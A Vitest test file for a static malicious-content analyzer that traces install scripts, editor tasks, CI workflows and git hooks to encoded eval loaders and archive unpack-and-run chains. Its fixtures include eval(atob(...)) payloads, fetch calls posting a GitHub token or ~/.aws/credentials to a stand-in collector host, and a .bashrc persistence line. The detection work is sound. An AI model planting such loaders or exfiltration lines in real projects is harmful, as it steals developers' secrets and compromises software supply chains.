import { describe, expect, it } from 'vitest';
import { analyzeMaliciousContent } from '../../src/analyzers/malicious-content/analyzer.js';

describe('non-executing malicious content chain analysis', () => {
  it('measures a fixed benign and suspicious fixture corpus without running files', () => {
    const corpus = [
      {
        label: 'ordinary bundler scripts',
        expectedFinding: false,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({
              scripts: { build: 'vite build', test: 'vitest run' }
            })
          }
        ]
      },
      {
        label: 'benign automatic editor task',
        expectedFinding: false,
        files: [
          {
            path: '.vscode/tasks.json',
            content: JSON.stringify({
              tasks: [
                {
                  runOptions: { runOn: 'folderOpen' },
                  command: 'npm',
                  args: ['run', 'build']
                }
              ]
            })
          },
          {
            path: 'package.json',
            content: JSON.stringify({ scripts: { build: 'tsc --noEmit' } })
          }
        ]
      },
      {
        label: 'inert encoded example text',
        expectedFinding: false,
        files: [
          {
            path: 'README.md',
            content: 'Buffer.from("eA==", "base64") is an encoding example.'
          }
        ]
      },
      {
        label: 'archive creation in a build script',
        expectedFinding: false,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({
              scripts: {
                build: 'tar -czf dist.tar.gz ./dist && node ./build.js'
              }
            })
          },
          { path: 'build.js', content: "console.log('built');" }
        ]
      },
      {
        label: 'benign source renamed to an unusual extension',
        expectedFinding: false,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({ scripts: { build: 'node ./build.orc' } })
          },
          { path: 'build.orc', content: "console.log('bundle built');" }
        ]
      },
      {
        label: 'whitespace-only command formatting change',
        expectedFinding: false,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({
              scripts: { prepare: 'node    ./prepare.js   ' }
            })
          },
          { path: 'prepare.js', content: "console.log('prepare');" }
        ]
      },
      {
        label: 'benign base64 data used as text',
        expectedFinding: false,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({ scripts: { build: 'node ./build.js' } })
          },
          {
            path: 'build.js',
            content:
              "const message = Buffer.from('aGVsbG8=', 'base64').toString(); console.log(message);"
          }
        ]
      },
      {
        label: 'encoded lifecycle payload',
        expectedFinding: true,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({ scripts: { prepare: 'node init' } })
          },
          { path: 'init', content: 'const p = atob(value); eval(p);' }
        ]
      },
      {
        label: 'imported child process in tool config',
        expectedFinding: true,
        files: [
          {
            path: 'eslint.config.js',
            content:
              "import { spawn as launch } from 'node:child_process'; launch('node', ['loader.js']);"
          }
        ]
      },
      {
        label: 'archive extraction and launch',
        expectedFinding: true,
        files: [
          {
            path: 'package.json',
            content: JSON.stringify({
              scripts: { prepare: 'tar -xzf bundle.tgz && node ./out/init.js' }
            })
          }
        ]
      }
    ] as const;

    const outcomes = corpus.map(({ expectedFinding, files }) => ({
      expectedFinding,
      actualFinding: analyzeMaliciousContent(files).findings.length > 0
    }));
    const falsePositives = outcomes.filter(
      (outcome) => !outcome.expectedFinding && outcome.actualFinding
    ).length;
    const falseNegatives = outcomes.filter(
      (outcome) => outcome.expectedFinding && !outcome.actualFinding
    ).length;
    expect({ falsePositives, falseNegatives }).toEqual({
      falsePositives: 0,
      falseNegatives: 0
    });
  });

  it('follows nested npm scripts to a suspicious local execution target', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            prepare: 'npm run stage:payload.min',
            'stage:payload.min': 'node ./loader.js'
          }
        })
      },
      {
        path: 'loader.js',
        content: "const code = atob('ZXZpbA=='); eval(code);"
      }
    ]);

    expect(
      result.findings.some(
        (finding) =>
          JSON.stringify(finding.metadata?.trace) ===
          JSON.stringify([
            'package.json',
            'package.json#scripts.stage:payload.min',
            'loader.js'
          ])
      )
    ).toBe(true);
  });

  it('keeps nested ordinary npm scripts clean', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'npm run build', build: 'vite build' }
        })
      }
    ]);

    expect(result.findings).toEqual([]);
  });

  it.each([
    'npm run-script payload',
    'pnpm run payload',
    'yarn run payload'
  ])('follows package-manager command %s', (command) => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: command, payload: 'node ./loader.js' }
        })
      },
      {
        path: 'loader.js',
        content: "const code = atob('ZXZpbA=='); eval(code);"
      }
    ]);

    expect(
      result.findings.some((finding) =>
        (finding.metadata?.trace as string[] | undefined)?.includes(
          'package.json#scripts.payload'
        )
      )
    ).toBe(true);
  });

  it('bounds cyclic nested package scripts without reporting benign work', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'npm run build', build: 'yarn run prepare' }
        })
      }
    ]);

    expect(result.findings).toEqual([]);
  });

  it.each([
    'npm --workspace packages/web run prepare',
    'pnpm --filter @scope/web run prepare',
    'yarn workspace @scope/web prepare'
  ])('follows explicit workspace script command %s', (command) => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: command } })
      },
      {
        path: 'packages/web/package.json',
        content: JSON.stringify({
          name: '@scope/web',
          scripts: { prepare: 'node init' }
        })
      },
      {
        path: 'packages/web/init',
        content: "const code = atob('ZXZpbA=='); eval(code);"
      }
    ]);

    expect(
      result.findings.some(
        (finding) =>
          JSON.stringify(finding.metadata?.trace) ===
          JSON.stringify([
            'package.json',
            'packages/web/package.json#scripts.prepare',
            'packages/web/init'
          ])
      )
    ).toBe(true);
  });

  it('marks shell-selected nested package scripts as unresolved', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'npm run "$TOOLIP_SCRIPT"' }
        })
      }
    ]);

    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-002');
    expect(result.findings[0]?.metadata?.trace).toEqual(['package.json']);
  });

  it.each([
    [
      'aliased ESM imports',
      "import { spawn as launch } from 'node:child_process'; launch('node', ['payload.js']);"
    ],
    [
      'destructured CommonJS aliases',
      "const { execFile: launch } = require('child_process'); launch('node', ['payload.js']);"
    ],
    [
      'namespace aliases',
      "const cp = require('node:child_process'); cp.spawn('node', ['payload.js']);"
    ],
    [
      'default ESM namespace imports',
      "import childProcess from 'node:child_process'; childProcess.execFile('node', ['payload.js']);"
    ],
    [
      'direct CommonJS member calls',
      "require('child_process').fork('payload.js');"
    ],
    [
      'statically aliased child-process methods',
      "import * as cp from 'node:child_process'; const launch = cp.spawn; launch('node', ['payload.js']);"
    ],
    [
      'literal dynamic import aliases',
      "const { spawn: launch } = await import('node:child_process'); launch('node', ['payload.js']);"
    ],
    [
      'computed namespace methods',
      "import * as cp from 'node:child_process'; cp[method]('node', ['payload.js']);"
    ],
    [
      'nonliteral module resolution',
      'await import(process.env.CONFIGURED_LOADER);'
    ]
  ])('keeps %s as unresolved dynamic execution', (_name, source) => {
    const result = analyzeMaliciousContent([
      { path: 'eslint.config.js', content: source }
    ]);
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-002');
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it('traces a package prepare script to encoded extensionless dynamic code', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node init' } })
      },
      {
        path: 'init',
        content:
          "const payload = Buffer.from('eA==', 'base64').toString(); eval(atob(payload));"
      }
    ]);
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.severity).toBe('high');
    expect(result.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'init'
    ]);
  });

  it('traces a uniquely assigned shell script path through a wrapper without executing it', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      { path: 'runner.sh', content: 'target=./payload.orc; node "$target"' },
      {
        path: 'payload.orc',
        content: 'const decoded = atob(encoded); eval(decoded);'
      }
    ]);
    const finding = result.findings.find(
      (item) => item.location.file === 'package.json'
    );
    expect(finding?.metadata?.trace).toEqual([
      'package.json',
      'runner.sh',
      'payload.orc'
    ]);
  });

  it('traces two literal shell aliases to a local suspicious payload without execution', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content: 'target=./payload.orc; launch=$target; node "$launch"'
      },
      {
        path: 'payload.orc',
        content: 'const decoded = atob(encoded); eval(decoded);'
      }
    ]);
    expect(
      result.findings.find(
        (finding) => finding.location.file === 'package.json'
      )?.metadata?.trace
    ).toEqual(['package.json', 'runner.sh', 'payload.orc']);
  });

  it('traces an exact local target passed through a shell -c variable alias', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content: 'target=./payload.orc; sh -c "$target"'
      },
      {
        path: 'payload.orc',
        content: 'const decoded = atob(encoded); eval(decoded);'
      }
    ]);
    expect(
      result.findings.find(
        (finding) => finding.location.file === 'package.json'
      )?.metadata?.trace
    ).toEqual(['package.json', 'runner.sh', 'payload.orc']);
  });

  it('reports a dynamic shell -c target as unknown instead of clean', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content: 'target=$GENERATED_TARGET; sh -c "$target"'
      }
    ]);
    expect(
      result.findings.some((finding) => finding.ruleId === 'TLP-MAL-002')
    ).toBe(true);
  });

  it('reports shell eval command text as unresolved execution', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      { path: 'runner.sh', content: 'eval "$COMMAND"' }
    ]);
    expect(
      result.findings.some((finding) => finding.ruleId === 'TLP-MAL-002')
    ).toBe(true);
  });

  it('does not interpolate a single-quoted shell alias', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content: 'target=./payload.orc; launch=\'$target\'; node "$launch"'
      },
      {
        path: 'payload.orc',
        content: 'const decoded = atob(encoded); eval(decoded);'
      }
    ]);
    const trace = result.findings.find(
      (finding) => finding.location.file === 'package.json'
    )?.metadata?.trace;
    expect(trace).not.toEqual(['package.json', 'runner.sh', 'payload.orc']);
  });

  it('keeps reassigned transitive shell aliases unresolved', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content:
          'target=./first.js; target=./second.js; launch=$target; node "$launch"'
      },
      {
        path: 'first.js',
        content: 'const decoded = atob(encoded); eval(decoded);'
      },
      {
        path: 'second.js',
        content: 'const decoded = atob(encoded); eval(decoded);'
      }
    ]);
    const traced = result.findings.find(
      (finding) => finding.location.file === 'package.json'
    )?.metadata?.trace;
    expect(traced).not.toEqual(['package.json', 'runner.sh', 'first.js']);
    expect(traced).not.toEqual(['package.json', 'runner.sh', 'second.js']);
  });

  it('does not claim a single target when shell assignment is ambiguous', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      {
        path: 'runner.sh',
        content: 'target=./first.js; target=./second.js; node "$target"'
      },
      {
        path: 'first.js',
        content: 'const decoded = atob(encoded); eval(decoded);'
      },
      { path: 'second.js', content: 'console.log("ok")' }
    ]);
    const finding = result.findings.find(
      (item) => item.location.file === 'package.json'
    );
    expect(finding?.metadata?.completeness).toBe('unknown');
    expect(finding?.metadata?.trace).not.toContain('first.js');
  });

  it('retains shell-variable targets when more than 256 other references exhaust the content cache slice', () => {
    const safeFiles = Array.from({ length: 270 }, (_, index) => ({
      path: 'safe-' + index + '.sh',
      content: '#!/bin/sh\n:'
    }));
    const wrapper = [
      ...safeFiles.map((file) => 'source ./' + file.path),
      'target=./payload.orc; node "$target"'
    ].join('\n');
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'sh ./runner.sh' } })
      },
      { path: 'runner.sh', content: wrapper },
      {
        path: 'payload.orc',
        content: 'const payload = atob(encoded); eval(payload);'
      },
      ...safeFiles
    ]);
    const finding = result.findings.find(
      (item) => item.location.file === 'package.json'
    );
    expect(finding?.ruleId).toBe('TLP-MAL-001');
    expect(finding?.metadata?.trace).toContain('payload.orc');
  });

  it('traces Node preload flags to local files before a lifecycle script starts', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'node --require ./init.js ./safe.js' }
        })
      },
      { path: 'safe.js', content: 'console.log("ok");' },
      {
        path: 'init.js',
        content: 'const payload = atob(encoded); eval(payload);'
      }
    ]);
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: 'TLP-MAL-001',
          metadata: expect.objectContaining({
            trace: expect.arrayContaining(['package.json', 'init.js'])
          })
        })
      ])
    );
  });

  it('traces an encoded tool-config loader into an extensionless outbound target', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'eslint.config.js',
        content:
          "import './init';\nconst payload = atob(encoded); eval(payload);"
      },
      {
        path: 'init',
        content:
          "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { method: 'POST', body: process.env.GITHUB_TOKEN });"
      }
    ]);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.trace).toEqual([
      'eslint.config.js',
      'init'
    ]);
    expect(JSON.stringify(result.findings)).not.toContain(
      'https://collector.invalid'
    );
    expect(JSON.stringify(result.findings)).not.toContain('GITHUB_TOKEN');
  });

  it('reads VS Code JSONC tasks with comments and trailing commas before tracing auto-run scripts', () => {
    const result = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: [
          '{',
          '  // VS Code permits JSONC in tasks.json',
          '  "version": "2.0.0",',
          '  "tasks": [{ "runOptions": { "runOn": "folderOpen" }, "command": "node init", },],',
          '}'
        ].join('\n')
      },
      { path: 'init', content: 'const payload = atob(encoded); eval(payload);' }
    ]);
    expect(result.coverage.state).toBe('complete');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: 'TLP-MAL-001',
          metadata: expect.objectContaining({
            trace: ['.vscode/tasks.json', 'init']
          })
        })
      ])
    );
  });

  it('detects an editor folder-open task through nested local references without running them', () => {
    const result = analyzeMaliciousContent([
      {
        path: '.vscode/tasks.json',
        content: JSON.stringify({
          tasks: [
            {
              runOptions: { runOn: 'folderOpen' },
              command: 'node start'
            }
          ]
        })
      },
      { path: 'start', content: "require('./payload.orc');" },
      { path: 'payload.orc', content: 'eval(atob(encoded));' }
    ]);
    expect(result.findings[0]?.metadata?.trace).toEqual([
      '.vscode/tasks.json',
      'start',
      'payload.orc'
    ]);
    expect(result.findings[0]?.confidence).toBe('high');
  });

  it('traces automatic GitHub Actions and Husky entrypoints through shell sources', () => {
    const result = analyzeMaliciousContent([
      {
        path: '.github/workflows/build.yml',
        content: [
          'name: build',
          'on: [push]',
          'jobs:',
          '  build:',
          '    steps:',
          '      - run: bash scripts/bootstrap.sh'
        ].join('\n')
      },
      {
        path: '.husky/pre-commit',
        content: 'sh scripts/bootstrap.sh'
      },
      {
        path: 'scripts/bootstrap.sh',
        content: 'source ./payload.orc'
      },
      { path: 'scripts/payload.orc', content: 'eval(atob(encoded));' }
    ]);

    const workflowFinding = result.findings.find(
      (finding) => finding.metadata?.entrypointKind === 'github-actions-run'
    );
    const hookFinding = result.findings.find(
      (finding) => finding.metadata?.entrypointKind === 'git-hook'
    );
    expect(workflowFinding?.metadata?.trace).toEqual([
      '.github/workflows/build.yml',
      'scripts/bootstrap.sh',
      'scripts/payload.orc'
    ]);
    expect(hookFinding?.metadata?.trace).toEqual([
      '.husky/pre-commit',
      'scripts/bootstrap.sh',
      'scripts/payload.orc'
    ]);
    expect(result.coverage.state).toBe('complete');
  });

  it('traces an automatic npm task through the matching workspace script', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'packages/web/.vscode/tasks.json',
        content: JSON.stringify({
          tasks: [
            {
              runOptions: { runOn: 'folderOpen' },
              type: 'npm',
              script: 'prepare'
            }
          ]
        })
      },
      {
        path: 'packages/web/package.json',
        content: JSON.stringify({ scripts: { prepare: 'node init' } })
      },
      {
        path: 'packages/web/init',
        content: 'const source = atob(encoded); eval(source);'
      }
    ]);
    const taskFinding = result.findings.find(
      (finding) => finding.metadata?.entrypointKind === 'editor-task'
    );
    expect(taskFinding?.ruleId).toBe('TLP-MAL-001');
    expect(taskFinding?.metadata?.trace).toEqual([
      'packages/web/.vscode/tasks.json',
      'packages/web/package.json',
      'packages/web/init'
    ]);
  });

  it('follows direct extensionless executable references from npm scripts', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: './init' } })
      },
      {
        path: 'init',
        content:
          '#!/usr/bin/env node\nconst payload = atob(encoded); eval(payload);'
      }
    ]);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'init'
    ]);
  });

  it('resolves an extensionless interpreter command to one uniquely disguised target', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node bootstrap' } })
      },
      {
        path: 'bootstrap.orc',
        content: 'const payload = atob(encoded); eval(payload);'
      }
    ]);

    expect(result.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'bootstrap.orc'
    ]);
    expect(result.findings[0]?.confidence).toBe('high');
  });

  it('invalidates cached source signatures and references when file content changes', () => {
    const manifest = {
      path: 'package.json',
      content: JSON.stringify({ scripts: { prepare: 'node init' } })
    };
    const safe = analyzeMaliciousContent([
      manifest,
      { path: 'init.orc', content: "console.log('ready');" }
    ]);
    const changed = analyzeMaliciousContent([
      manifest,
      {
        path: 'init.orc',
        content: 'const payload = atob(encoded); eval(payload);'
      }
    ]);

    expect(safe.findings).toEqual([]);
    expect(changed.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'init.orc'
    ]);
  });

  it('keeps tracing import edges after the content-reference cache slice fills', () => {
    const imports = Array.from(
      { length: 260 },
      (_, index) => `import './safe-${index}.orc';`
    );
    imports.push("import './payload.orc';");
    const files = [
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node bootstrap' } })
      },
      { path: 'bootstrap', content: imports.join('\n') },
      ...Array.from({ length: 260 }, (_, index) => ({
        path: `safe-${index}.orc`,
        content: "console.log('ready');"
      })),
      {
        path: 'payload.orc',
        content: 'const payload = atob(encoded); eval(payload);'
      }
    ];
    const result = analyzeMaliciousContent(files);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.trace).toContain('payload.orc');
  });

  it('discovers shebang scripts with unfamiliar names even without a manifest reference', () => {
    const result = analyzeMaliciousContent([
      {
        path: '.hidden/bootstrap.orc',
        content:
          '#!/usr/bin/env node\nconst payload = atob(encoded); eval(payload);'
      }
    ]);

    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.metadata?.entrypointKind).toBe('shebang-script');
    expect(result.findings[0]?.location?.file).toBe('.hidden/bootstrap.orc');
  });

  it('follows Ruby and Windows command launchers into disguised targets', () => {
    const ruby = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'ruby bootstrap' } })
      },
      { path: 'bootstrap.rb', content: "load './payload.orc'" },
      { path: 'payload.orc', content: 'eval(atob(encoded_source))' }
    ]);
    const windows = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'cmd /c init.cmd' } })
      },
      { path: 'init.cmd', content: 'php payload.orc' },
      { path: 'payload.orc', content: 'eval(atob(encoded_source))' }
    ]);

    expect(ruby.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'bootstrap.rb',
      'payload.orc'
    ]);
    expect(windows.findings[0]?.metadata?.trace).toEqual([
      'package.json',
      'init.cmd',
      'payload.orc'
    ]);
  });

  it('distinguishes harmless archive creation from unpack-and-execute behavior', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { build: 'tar -czf dist.tar.gz ./dist && node ./build.js' }
        })
      },
      { path: 'build.js', content: 'console.log("built");' }
    ]);
    expect(
      result.findings.some((finding) =>
        JSON.stringify(finding.metadata?.behaviorSignals ?? []).includes(
          'archive-extraction-and-execution'
        )
      )
    ).toBe(false);
  });

  it('recognizes tar extraction with POSIX option bundles lacking a dash', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'tar xvf bundle.tar && node ./payload/init' }
        })
      }
    ]);
    expect(
      result.findings.some((finding) =>
        JSON.stringify(finding.metadata?.behaviorSignals ?? []).includes(
          'archive-extraction-and-execution'
        )
      )
    ).toBe(true);
  });

  it('reports archive extraction followed by execution as an unresolved chain', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            prepare: 'tar -xzf payload.tar.gz && node ./payload/init'
          }
        })
      }
    ]);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it('detects archive extraction followed by execution on another command line', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            prepare: '7z e payload.7z\n./payload/init.sh'
          }
        })
      }
    ]);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'archive-extraction-and-execution'
    );
  });

  it('recognizes PowerShell and Python archive extraction followed by execution', () => {
    for (const command of [
      'cpio -idmv < bundle.cpio && ./bundle/init.sh',
      'Expand-Archive bundle.zip -DestinationPath out\n& .\\out\\init.ps1',
      'python -m zipfile -e bundle.zip out\npython out/init.py',
      'jar xf bundle.jar\njava -jar bundle/app.jar',
      'unrar x bundle.rar\n./bundle/init.sh',
      '7zz x bundle.7z\nnode bundle/init.js',
      '7zr x bundle.7z\nnode bundle/init.js'
    ]) {
      const result = analyzeMaliciousContent([
        {
          path: 'package.json',
          content: JSON.stringify({ scripts: { prepare: command } })
        }
      ]);
      expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
        'archive-extraction-and-execution'
      );
      expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
    }
  });

  it('does not treat CPIO creation or table-of-contents listing as extraction', () => {
    for (const command of [
      'find dist | cpio -o > bundle.cpio && node ./build.js',
      'cpio -it < bundle.cpio && node ./build.js'
    ]) {
      const result = analyzeMaliciousContent([
        {
          path: 'package.json',
          content: JSON.stringify({ scripts: { build: command } })
        },
        { path: 'build.js', content: 'console.log("built");' }
      ]);
      expect(
        result.findings.some((finding) =>
          JSON.stringify(finding.metadata?.behaviorSignals ?? []).includes(
            'archive-extraction-and-execution'
          )
        )
      ).toBe(false);
    }
  });

  it('does not classify 7zr archive creation as extraction', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { build: '7zr a bundle.7z ./dist && node ./build.js' }
        })
      },
      { path: 'build.js', content: 'console.log("build");' }
    ]);

    expect(
      result.findings.some((finding) =>
        finding.metadata?.behaviorSignals?.includes(
          'archive-extraction-and-execution'
        )
      )
    ).toBe(false);
  });

  it('recognizes Windows batch call launchers after archive extraction', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            prepare: 'cpio -id < bundle.cpio && call .\\bundle\\init.cmd'
          }
        })
      }
    ]);
    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'archive-extraction-and-execution'
    );
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it('recognizes PowerShell Start-Process after archive extraction', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: {
            prepare:
              'Expand-Archive bundle.zip -DestinationPath out; Start-Process -FilePath .\\out\\init.exe'
          }
        })
      }
    ]);
    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'archive-extraction-and-execution'
    );
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it('keeps language-level archive extraction followed by process launch unknown', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({
          scripts: { prepare: 'python3 bootstrap.py' }
        })
      },
      {
        path: 'bootstrap.py',
        content: [
          'import subprocess',
          'import zipfile',
          "with zipfile.ZipFile('bundle.zip') as archive:",
          "    archive.extractall('out')",
          "subprocess.run(['node', 'out/init.js'])"
        ].join('\n')
      }
    ]);
    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'archive-extraction-and-execution'
    );
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it.each([
    [
      'AdmZip',
      "new AdmZip('bundle.zip').extractAllTo('out'); child_process.spawn('node', ['out/init.js']);"
    ],
    [
      'node tar API',
      "tar.x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
    ],
    [
      'Python shutil API',
      "shutil.unpack_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
    ],
    [
      'unzipper API',
      "unzipper.Extract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
    ],
    [
      'extract-zip API',
      "extractZip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
    ],
    [
      'decompress API',
      "decompress('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
    ],
    [
      'node-stream-zip API',
      "zip.extract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
    ]
  ])(
    'keeps %s extraction followed by process launch unknown',
    (_label, code) => {
      const result = analyzeMaliciousContent([
        {
          path: 'package.json',
          content: JSON.stringify({ scripts: { prepare: 'node bootstrap.js' } })
        },
        { path: 'bootstrap.js', content: code }
      ]);

      expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
      expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
        'archive-extraction-and-execution'
      );
      expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
    }
  );

  it('does not treat archive library creation as extraction', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node bootstrap.js' } })
      },
      {
        path: 'bootstrap.js',
        content:
          "decompressor.on('entry', () => child_process.spawn('node', ['build.js']));"
      }
    ]);

    expect(result.findings[0]?.metadata?.behaviorSignals ?? []).not.toContain(
      'archive-extraction-and-execution'
    );
  });

  it('reports unresolved dynamic targets rather than a clean result', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { build: 'node $TOOLIP_TARGET' } })
      }
    ]);
    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-002');
    expect(result.findings[0]?.severity).toBe('medium');
    expect(result.findings[0]?.confidence).toBe('low');
    expect(result.findings[0]?.metadata?.completeness).toBe('unknown');
  });

  it('does not flag ordinary build commands or inert encoded text', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { build: 'vite build' } })
      },
      {
        path: 'README.md',
        content: 'Example: Buffer.from("eA==", "base64") is data only.'
      }
    ]);
    expect(result.findings).toEqual([]);
  });

  it('identifies credential-store access paired with outbound transfer without exposing source', () => {
    const secret = '/home/runner/.aws/credentials';
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node bootstrap' } })
      },
      {
        path: 'bootstrap',
        content: `const credentials = fs.readFileSync('${secret}'); fetch('https://collector.invalid', { method: 'POST', body: credentials });`
      }
    ]);

    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'credential-access-with-outbound-transfer'
    );
    expect(JSON.stringify(result.findings)).not.toContain(secret);
  });

  it('identifies a payload that establishes startup persistence', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { postinstall: 'node bootstrap' } })
      },
      {
        path: 'bootstrap',
        content:
          "const payload = atob(encoded); eval(payload); fs.appendFileSync('~/.bashrc', 'node ~/.cache/update');"
      }
    ]);

    expect(result.findings[0]?.metadata?.behaviorSignals).toContain(
      'download-or-payload-with-startup-persistence'
    );
  });

  it('does not treat credential reads or persistence setup alone as malicious', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { build: 'node configure' } })
      },
      {
        path: 'configure',
        content:
          "const config = fs.readFileSync('~/.npmrc'); fs.appendFileSync('~/.bashrc', 'export PATH=$PATH');"
      }
    ]);

    expect(result.findings).toEqual([]);
  });

  it('does not classify an initializer name as malicious without suspicious behavior', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node init' } })
      },
      { path: 'init', content: "console.log('initialized');" }
    ]);
    expect(result.findings).toEqual([]);
  });

  it('does not resolve path traversal as a local target', () => {
    const result = analyzeMaliciousContent([
      {
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepare: 'node ../../outside' } })
      }
    ]);
